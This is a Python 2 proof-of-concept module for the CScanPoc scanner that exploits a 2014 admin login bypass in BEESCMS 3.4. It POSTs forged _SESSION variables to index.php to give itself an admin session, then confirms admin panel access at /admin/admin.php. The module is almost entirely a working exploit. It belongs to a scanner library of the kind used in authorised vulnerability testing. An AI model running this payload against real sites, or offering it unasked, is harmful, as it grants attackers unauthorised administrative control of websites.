# coding: utf-8
import re
import cookielib
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'BEESCMS_0002'  # 平台漏洞编号，留空
    name = 'BEESCMS 3.4 /admin/admin.php 登录绕过'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-10-05'  # 漏洞公布时间
    desc = '''
    BEESCMS v3.4 /includes/fun.php 弱验证导致后台验证绕过。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-059180
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'BEESCMS'  # 漏洞应用名称
    product_version = '3.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '61220421-2cce-4de9-84d2-edc0f8ff3944'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            cookie = cookielib.CookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
            urllib2.install_opener(opener)
            postdata = "_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\\r\\n"
            # get session
            request = urllib2.Request(
                self.target + "/index.php", data=postdata)
            r = urllib2.urlopen(request)
            # login test
            request2 = urllib2.Request(
                self.target + "/admin/admin.php", data=postdata)
            r = urllib2.urlopen(request2)
            content = r.read()
            if "admin_form.php?action=form_list&nav=list_order" in content:
                if "admin_main.php?nav=main" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
